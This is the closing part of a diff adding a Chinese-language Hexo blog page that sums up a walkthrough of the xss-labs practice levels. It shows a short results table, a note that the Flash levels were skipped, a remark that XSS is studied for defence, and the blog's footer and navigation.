+<td>空格过滤绕过（换行符代替）</td>
+</tr>
+<tr>
+<td>Level 17-20</td>
+<td>❌ 跳过</td>
+<td>Flash 已淘汰，无法完成</td>
+</tr>
+</tbody></table>
+<p><strong>实际有效通关：16 关（其中 14 关自主完成）</strong></p>
+<hr>
+<blockquote>
+<p>学习XSS不是为了攻击别人，而是为了更好地防御。了解攻击者的思路，才能写出更安全的代码。</p>
+</blockquote>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>John Doe</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="https://cai-cai-jun.github.io/2026/07/29/xss%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/">https://cai-cai-jun.github.io/2026/07/29/xss%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/XSS/"># XSS</a>
+                    
+                        <a href="/tags/Web%E5%AE%89%E5%85%A8/"># Web安全</a>
+                    
+                        <a href="/tags/CTF/"># CTF</a>
+                    
+                        <a href="/tags/xss-labs/"># xss-labs</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2026/08/03/XSS-CTF%E5%A4%87%E5%BF%98%E5%BD%95/">XSS CTF 备忘录</a>
+            
+            
+            <a class="next" rel="next" href="/2026/07/15/%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81%E5%AD%A6/">古典密码学从入门到入土</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© John Doe | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
